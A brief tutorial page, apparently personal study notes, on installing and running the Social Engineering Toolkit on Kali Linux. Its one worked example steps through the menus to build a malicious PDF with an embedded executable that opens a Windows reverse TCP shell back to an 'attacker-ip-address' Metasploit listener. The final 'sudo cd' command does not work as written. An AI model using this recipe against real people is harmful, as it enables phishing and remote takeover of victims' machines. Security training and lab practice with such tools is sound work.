<h6>ver. Aug-2022</h6>
<h2> Social Engineering Toolkit (SET)</h2>

Refer to https://www.kali.org/tools/set/

<h3><u> On Kali Linux</u></h3>

<h5> Step-1. Install</h5>
<h5> Setp-2. Execute (<i>root privilege required</i>)</h5>
<h5> Setp-3. Follow attack instructions</h5>

<i>Refer to https://github.com/trustedsec/social-engineer-toolkit/blob/master/readme/User_Manual.pdf</i> (old version)

```sh
# it is a default tool in Kali. if not installed
sudo apt install set
# invoke SET
sudo setoolkit
# follow the options

# attack example-1
> 1) Social Engineering Attacks
> 3) Infectious Media Generator
> 1) File Format Exploits
> IP address for the reverse connection (payload): attacker-ip-address
> 13) Adobe PDF Embedded EXE Social Engineering
> 2) Use built-in BLANK PDF for attack
> 1) Windows Reverse TCP Shell
> IP address for the payload listener (LHOST): attacker-ip-address
> Port to connect back on (443): # set Firewall open the port
> Create a listener right now [yes|no]
> # Metasploit opens up and listen
> # Listening to

sudo cd /.set/autorun


```
